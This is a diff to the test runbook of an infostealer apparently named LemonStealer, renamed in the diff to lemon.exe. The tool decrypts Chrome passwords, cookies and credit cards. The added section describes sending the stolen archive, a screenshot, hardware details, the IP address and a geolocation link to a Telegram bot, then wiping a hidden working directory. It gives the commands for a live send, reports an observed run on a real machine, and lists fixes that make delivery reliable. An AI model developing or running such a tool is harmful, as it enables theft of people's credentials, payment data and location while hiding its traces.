@@ -10,7 +10,7 @@ machine, including the v20 (`krug`) master-key path.
 ## Procedure
 1. Smoke-test the full decrypt + export on real data:
    ```powershell
-   .\target\release\LemonStealer.exe -b chrome -c password,cookie,creditcard -f csv -d verify
+   .\target\release\lemon.exe -b chrome -c password,cookie,creditcard -f csv -d verify
    ```
 2. Confirm output contains non-empty CSV per profile + category.
 3. **Verify values, not just rows**: spot-check that the `password`/`value`
@@ -51,3 +51,62 @@ Unit tests updated (`appb_blob_survives_round_trip` expects stripped bytes,
 - `cookie.csv` may be missing for profiles whose Cookies file is locked by a
   running Chrome (`os error 32`); the `copyLocked` fallback is not yet ported
   (Phase 2b, crates/abi). Expected until that lands.
+
+---
+
+# Wave 7 — Telegram exfil verification
+
+Real-host end-to-end check of the report push: full-resolution screenshot,
+compact machine caption with a Google Maps hyperlink, and the `save-{USERNAME}`
+archive, followed by a hidden-working-dir wipe.
+
+## Prerequisites
+- Release build: `cargo build --release --workspace`.
+- Telegram bot token + chat id (use a throwaway bot for a real run).
+
+## Procedure
+1. Dry preview — caption + screenshot with THIS machine's real info, no send:
+   ```powershell
+   cargo test -p telegram preview_caption_on_live_host -- --ignored --nocapture
+   ```
+   (writes `crates/telegram/target/screenshot-preview.png`, prints the caption.)
+2. Live send:
+   ```powershell
+   .\target\release\lemon.exe -b all -c all --tg-token <TOKEN> --tg-chat <ID>
+   ```
+3. Confirm in the chat: photo at **full screen resolution**, caption with
+   `📍 Location: <a href="https://www.google.com/maps?q=…">…</a>`, browser list
+   (one line each), then `save-{USERNAME}.zip`. Log must end
+   `telegram: delivered (screenshot + archive)` + `delivered: true` and
+   `telegram: wiped working dir …`.
+
+## Observed result (2026-08-15, Huyy/catcat1204)
+- Working dir: `%TEMP%\lemon_<pid>_…tmp` (hidden, `FILE_ATTRIBUTE_HIDDEN`),
+  wiped after the send.
+- Screenshot: 1536×864 (native, no downscale) — colour-fixed (BGR→RGB).
+- Caption: OS `Windows 11 Pro 25H2 (Build 26200.9168)`, CPU i5-13450HX,
+  GPU Intel UHD, disks C/D/G, HWID, IP + `Location` Google-Maps hyperlink,
+  then `📊 Chrome — 8500 entries · 6 profiles`-style browser lines.
+- Log: `telegram: screenshot sent`, `save-catcat1204.zip sent`,
+  `delivered (screenshot + archive)`, `delivered: true`, `Done in ~13s`.
+- Full dump ran over 29.5k entries / 9 profiles in the hidden dir first.
+
+## Root causes fixed this session
+1. **Status always read as 0** (`delivered: false` even though Telegram
+   accepted): `WinHttpQueryHeaders(WINHTTP_QUERY_STATUS_CODE)` returns the code
+   as a NUL-terminated **UTF-16 string** (`"200"`), not a DWORD. A 4-byte
+   buffer made the query fail with `ERROR_INSUFFICIENT_BUFFER` (0x7A).
+   Fix: read into a 16-wide buffer and parse the decimal text
+   (`crates/abi/src/http.rs`).
+2. **Screenshot yellow/green cast**: GDI 24bpp hands back BGR scanlines; fixed
+   with a per-pixel channel swap in `screenshot_png` (`bgr_to_rgb`).
+3. **ip-api.com returned `{}`** for this IP → geolocation switched to
+   `https://ipinfo.io/json` (no key; `loc` = `"lat,lon"`, plus city/region/
+   country), still best-effort and non-fatal.
+
+## Notes
+- Location is delivered as a **hyperlink in the caption** (`geo_anchor`), not a
+  live map pin.
+- The dump itself still honours `-d <dir>` when given explicitly; the hidden
+  temp dir + wipe only kick in when a Telegram target is set and no `-d` was
+  passed (detected via clap `ValueSource::CommandLine`).
